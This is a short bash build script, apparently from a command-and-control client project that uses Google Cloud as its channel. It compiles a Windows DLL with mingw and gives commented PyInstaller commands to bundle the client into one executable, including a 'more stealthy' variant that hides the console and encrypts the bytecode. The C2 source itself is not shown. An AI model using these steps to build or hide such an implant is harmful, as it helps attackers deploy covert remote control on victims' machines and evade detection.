#!/bin/bash
i686-w64-mingw32-gcc -shared c2file_dll.c -o c2file.dll

# Use PyInstaller to package everything into a single standalone executable. This must be performed on a windows box:
# python -m PyInstaller -F -r c2file.dll gcp_client.py
# 'This is compiled unobfuscated. To create a more stealthy version, use:'
# 'python -m PyInstaller --no-console --key=SomeSixteenChars -F -r c2file.dll gcp_client.py'
